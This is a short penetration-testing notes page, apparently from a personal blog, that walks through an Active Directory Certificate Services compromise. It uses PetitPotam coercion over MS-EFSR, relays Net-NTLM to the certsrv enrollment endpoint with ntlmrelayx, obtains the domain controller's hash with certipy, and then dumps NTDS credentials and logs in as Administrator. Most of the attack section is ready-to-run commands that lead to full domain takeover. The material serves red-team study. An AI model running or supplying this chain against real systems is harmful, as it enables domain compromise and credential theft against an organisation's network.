---
title: "ADCS: Net-NTLM Relay & PetitPotam"
date: 2025-09-25
draft: false
---

# /notes/500-hacking/adcs_relay

![ADCS Overview](/images/ADCS/ADCSv.png)

## Certificate Templates
Templates are critical; they define the certificate's purpose. Common use cases include:
* **Client Authentication**
* **Email Encryption**
* **Code Signing**

![Certificate Template Info](/images/ADCS/Cert%20Info.png)

## Net-NTLM Relay to ADCS HTTP Endpoints
The Certificate Enrollment web interface is typically hosted at: `http://<ADCS-SERVER>/certsrv/`

### Forced Auth Coercion (PetitPotam)
Many forced auth coercion techniques utilize RPC calls to trigger authentication. Most RPC-based auth can be performed on servers with low-privileged authentication.

**Key Protocol:** `MS-EFSR` (Remotely manage encrypted information over the network using RPC).

**Attack Vector:**
* Can be exploited without domain credentials (unauthenticated) if unpatched.
* Connect to MS-EFSR service via `efsrpc`, `lsarpc`, `samr`, `lsass`, or `netlogon` named pipes.
* Send an `EfsRpcOpenFileRaw` request, directing it to your attacker machine.
* This tricks the DC into initiating a Net-NTLM handshake with your machine to "authenticate" before opening the file.

![Net-NTLM Relay Diagram](/images/ADCS/NetNTLM%20Relay.png)

---

## Exploitation Steps

### 1. Capture & Relay
Start your listener and trigger the coercion:

```bash
# Start Responder to see incoming requests
Responder -I $INT

# Trigger the DC to auth to us
python3 PetitPotam.py $ConnectBackAddr $DCIP -pipe all

# Relay the captured NT-NTLM hash to the ADCS Web Enrollment endpoint
ntlmrelayx.py -t http://$FQDN_OF_ADCS_SRV/certsrv/certfnsh.asp --adcs --template "Domain Controller" -smb2support
```

### 2. Unpac the Hash
Once you receive the PFX certificate from ntlmrelayx, you need to authenticate and retrieve the NT hash. This involves decrypting the PAC-CREDENTIAL-DATA.
```bash
# Authenticate using the certificate
certipy-ad auth -pfx "PFXFILE"
```

### 3. Domain Admin Persistence
With the NT hash of the Domain Controller (Machine Account), you can now perform DCSync or administrative tasks.

```bash
# Verify the hash with NetExec
nxc smb $DCIP -u "Index-dc01$" -H $Hash

# Pull the NTDS for a specific user
nxc smb $DCIP -u "Index-dc01$" -H $Hash --ntds --user "Administrator"

# Final login as DA
nxc smb $DCIP -u "Administrator" -H "$UserHash"
```

**DOMAIN ADMIN BABY.**